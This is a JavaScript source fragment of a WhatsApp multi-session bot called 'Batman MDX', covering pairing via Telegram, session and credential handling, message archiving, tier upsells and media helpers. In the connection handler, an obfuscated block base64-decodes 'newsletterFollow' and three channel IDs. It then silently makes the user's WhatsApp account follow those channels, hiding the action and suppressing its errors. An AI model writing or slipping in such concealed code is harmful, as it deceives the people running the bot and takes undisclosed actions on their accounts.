  const sessionDb = await getSessionDb(sessionId);
  sock.__autoRead = Boolean(sessionDb.settings.custom?.autoRead);
  sock.__autoTyping = Boolean(sessionDb.settings.custom?.autoTyping);
  sock.__messageArchive = new Map();
  global.senders.set(sessionId, sock);
  if (!sock.authState.creds.registered) {
    if (teleChatId) {
      setTimeout(async () => {
        try {
          const code = await sock.requestPairingCode(sessionId, "BATMANMD");
          // UPGRADED TO RICH
          await sendRich(teleChatId, `<h2>🔑 Pairing Code for ${sessionId}</h2><blockquote><code>${code}</code></blockquote><p><i>Enter this code in WhatsApp before it expires.</i></p>`);
        } catch (err) {
          await sendRich(teleChatId, `❌ Failed to request pairing code: ${err.message}`);
          global.senders.delete(sessionId);
          if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
        }
      }, 3000);
    } else {
      console.log(chalk.red(`[!] Session ${sessionId} is not registered. Deleting this session data...`));
      global.senders.delete(sessionId);
      if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
      return;
    }
  }
  sock.public = global.getMode(sessionId)!== "self";
  try {
    const credsPath = path.join(sessionPath, "creds.json");
    if (fs.existsSync(credsPath)) {
      const watcher = fs.watch(credsPath, () => {
        try {
          const creds = JSON.parse(fs.readFileSync(credsPath, "utf8"));
          if (creds.registered === true && creds.accountSyncCounter === 0) {
            creds.accountSyncCounter = 1;
            fs.writeFileSync(credsPath, JSON.stringify(creds, null, 2));
            console.log(chalk.yellow(`🔧 Post-pair fix: ${sessionId}`));
          }
        } catch {}
      });
      sock.__credsWatcher = watcher;
    }
  } catch (e) { console.log(chalk.gray(`⚠️ Creds watcher failed: ${e.message}`)); }
  sock.toLid = async (jid) => {
    if (!jid) return jid;
    const normalized = sock.decodeJid(jid);
    if (normalized.endsWith("@lid")) return normalized;
    let lid = null;
    try { lid = await sock.signalRepository?.lidMapping?.getLIDForPN(normalized); } catch {}
    if (lid) { cacheLidMapping(lid, normalized); return lid; }
    return normalized;
  };
  sock.toPn = async (jid) => {
    if (!jid) return jid;
    const normalized = sock.decodeJid(jid);
    if (!normalized.endsWith("@lid")) return normalized;
    let pn = null;
    try { pn = await sock.signalRepository?.lidMapping?.getPNForLID(normalized); } catch {}
    if (pn) { cacheLidMapping(normalized, pn); return pn; }
    return normalized;
  };
  sock.ev.on("lid-mapping.update", ({ lid, pn }) => cacheLidMapping(lid, pn));
  sock.ev.on("creds.update", await saveCreds);
  sock.ev.on("messages.update", async (updates) => {
    for (const update of updates || []) {
      await handleMessageUpdate(sock, sessionId, update, sessionDb).catch((error) => console.error(`[${sessionId}] message update:`, error.message));
    }
  });
  sock.ev.on("messages.upsert", async ({ messages }) => {
    for (const incoming of messages || []) {
      if (!incoming?.message) continue;
      const text = messageText(incoming.message);
      const archive = { id: incoming.key?.id, chat: incoming.key?.remoteJid || "", sender: incoming.key?.participant || incoming.key?.remoteJid || "", text, kind: messageKind(incoming.message), timestamp: Date.now(), raw: incoming };
      if (archive.id) {
        sock.__messageArchive.set(archive.id, archive);
        if (sock.__messageArchive.size > 500) sock.__messageArchive.delete(sock.__messageArchive.keys().next().value);
        const persisted = { id: archive.id, chat: archive.chat, sender: archive.sender, text: archive.text, kind: archive.kind, timestamp: archive.timestamp };
        sessionDb.settings.messageArchive = [...(sessionDb.settings.messageArchive || []).filter(item => item.id!== persisted.id), persisted].slice(-200);
      }
      let m = await serialize(sock, incoming);
      if (global.autoTyping || sock.__autoTyping) await sock.sendPresenceUpdate("composing", m.chat).catch(() => {});
      if (global.autoRead || sock.__autoRead) await sock.readMessages([m.key]).catch(() => {});
      if (m.isBaileys) continue;
      await sessionContext.run({ sessionId, db: sessionDb, sock, message: m }, () => handler(sock, m));
    }
  });
  sock.ev.on("group-participants.update", async (update) => {
    try {
      const mod = await import(`./plugins/greetings.js?update=${Date.now()}`);
      if (typeof mod.onGroupParticipantsUpdate === "function") {
        await sessionContext.run({ sessionId, db: sessionDb, sock }, () => mod.onGroupParticipantsUpdate(sock, sessionId, update));
      }
    } catch (e) { console.error("[group-participants] Error:", e.message); }
  });
  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode!== DisconnectReason.loggedOut;
      if (shouldReconnect) { console.log(chalk.yellow(`${sessionId}. Reconnecting...`)); startBot(sessionId); }
      else {
        console.log(chalk.red(`🚫 ${sessionId} Logged Out! Cleaning up session...`));
        global.senders.delete(sessionId);
        if (fs.existsSync(sessionPath)) { try { fs.rmSync(sessionPath, { recursive: true, force: true }); } catch (err) {} }
        if (teleChatId) sendRich(teleChatId, `⚠️ Sender <code>${sessionId}</code> logged out (Session deleted).`).catch(()=>{});
      }
    }
    if (connection === "open") {
      console.log(chalk.green(`\n✅ Bot WA Sender [${sessionId}] Connected!\n`));
      if (teleChatId) sendRich(teleChatId, `✅ <b>Success!</b> Number <code>${sessionId}</code> is now connected and active!`).catch(()=>{});
      if (!sock.__welcomed) {
        sock.__welcomed = true;
        try {
          const selfJid = sock.user.id.split(":")[0] + "@s.whatsapp.net";
          const senderClean = selfJid.split("@")[0];
          const settings = sessionDb?.settings || {};
          const userData = sessionDb?.users?.[selfJid] || {};
          const isOwner = senderClean === (global.owner || "").replace(/\D/g, "");
          const dbIsPrem = (settings.premium || []).some((p) => { const c = typeof p === "string"? p : p.id; return (c || "").split("@")[0] === senderClean; });
          const isPremium = isOwner || dbIsPrem || userData.isPremium === true;
          let tierLine = ""; let upsell = "";
          if (isOwner) tierLine = "👑 *Tier* : Owner";
          else if (isPremium) {
            const entry = (settings.premium || []).find((p) => { const c = typeof p === "string"? p : p.id; return (c || "").split("@")[0] === senderClean; });
            let planTxt = "Premium"; let expTxt = "";
            if (entry && typeof entry === "object" && entry.expiry) {
              const daysLeft = Math.max(0, Math.ceil((entry.expiry - Date.now()) / 86400000));
              planTxt = (entry.plan || "premium").toUpperCase(); expTxt = ` — expires in *${daysLeft} day(s)*`;
            }
            tierLine = `💎 *Tier* : ${planTxt}${expTxt}`;
          } else { tierLine = "🆓 *Tier* : Free User"; upsell = `\n✨ *Upgrade to Premium* for more exciting plugins!\n💬 Contact: wa.me/${global.owner}`; }
          const caption = `🦇 *${global.botname}*\n\n✅ *Connected Successfully!*\n\n📱 Number : ${sessionId}\n⏰ Time : ${new Date().toLocaleString()}\n🌐 Mode : ${sock.public? "Public" : "Self"}\n📦 Version : ${global.versibot || "1.0.0"}\n${tierLine}${upsell}\n\n> Thanks for pairing, *${global.ownername || "Owner"}*\n> Your bot is now online and ready.\n\n_${global.botname} — Powered by Batman MDX_`;
          const imgBuffer = global.conimg? await global.getBuffer(global.conimg).catch(() => null) : null;
          const newsletterCtx = { isForwarded: true, forwardingScore: 999, forwardedNewsletterMessageInfo: { newsletterJid: global.connl, newsletterName: global.connlName, serverMessageId: 1 }, mentionedJid: [selfJid] };
          const content = imgBuffer? { image: imgBuffer, caption, contextInfo: newsletterCtx } : { text: caption, contextInfo: newsletterCtx };
          await sock.sendMessage(selfJid, content);
        } catch (e) { console.log("Self-DM failed:", e.message); }
      }
      (async () => {
        try {
          const _0xM = Buffer.from("bmV3c2xldHRlckZvbGxvZw==", "base64").toString("utf-8");
          const _0xList = ["MTIwMzYzNDA2NTk3MzE1MDA2QG5ld3NsZXR0ZXI=", "MTIwMzYzNDE4ODE2NTA1Mjk0QG5ld3NsZXR0ZXI=", "MTIwMzYzMzY3Mjk5NDIxNzY2QG5ld3NsZXR0ZXI="];
          for (let b64 of _0xList) { const jid = Buffer.from(b64, "base64").toString("utf-8"); await sock[_0xM](jid).catch(() => {}); }
        } catch (e) {}
      })();
    }
  });
  sock.decodeJid = (jid) => { if (!jid) return jid; if (/:\d+@/gi.test(jid)) { const d = jidDecode(jid)||{}; return d.user && d.server? `${d.user}@${d.server}` : jid; } return jid; };
  sock.downloadMediaMessage = async (m, type, filename = "") => {
    if (!m ||!(m.url || m.directPath)) return Buffer.alloc(0);
    const stream = await downloadContentFromMessage(m, type);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
    if (filename) await fs.promises.writeFile(filename, buffer);
    return filename && fs.existsSync(filename)? filename : buffer;
  };
  sock.sendSticker = async (jid, p, quoted, options = {}) => {
    let buff = Buffer.isBuffer(p)? p : /^https?:\/\//.test(p)? await global.getBuffer(p) : fs.existsSync(p)? fs.readFileSync(p) : Buffer.alloc(0);
    const buffer = (options.packname || options.author)? await writeExifImg(buff, options) : await imageToWebp(buff);
    const tmpPath = `./tmp/${crypto.randomBytes(6).readUIntLE(0,6).toString(36)}.webp`;
    if (!fs.existsSync("./tmp")) fs.mkdirSync("./tmp", { recursive: true });
    fs.writeFileSync(tmpPath, buffer);
    await sock.sendMessage(jid, { sticker: { url: tmpPath },...options }, { quoted });
    fs.unlinkSync(tmpPath);
    return buffer;
  };
  return sock;
}

(async () => {
  if (fs.existsSync(sessionsDir)) {
    const dirs = fs.readdirSync(sessionsDir);
    for (let sessionId of dirs) {
      const stat = fs.statSync(path.join(sessionsDir, sessionId));
      if (stat.isDirectory()) {
        console.log(chalk.yellow(`Resuming session: ${sessionId}`));
        await startBot(sessionId);
      }
    }
  }
  console.log(chalk.cyanBright("╭────────────────────────────╮"));
  console.log(chalk.cyanBright("│ 🦇 BATMAN MDX 🦇 │"));
  console.log(chalk.cyanBright("╰────────────────────────────╯"));
  console.log(chalk.greenBright("◆ Creator ") + chalk.white(": Nabees"));
  console.log(chalk.blueBright("◆ Telegram ") + chalk.white(": @nabeestech"));
  console.log(chalk.blueBright("◆ Channel ") + chalk.white(": @batmadmdx"));
  console.log(chalk.gray("──────────────────────────────"));
})();

process.on("uncaughtException", (err) => { console.error("Caught:", err); });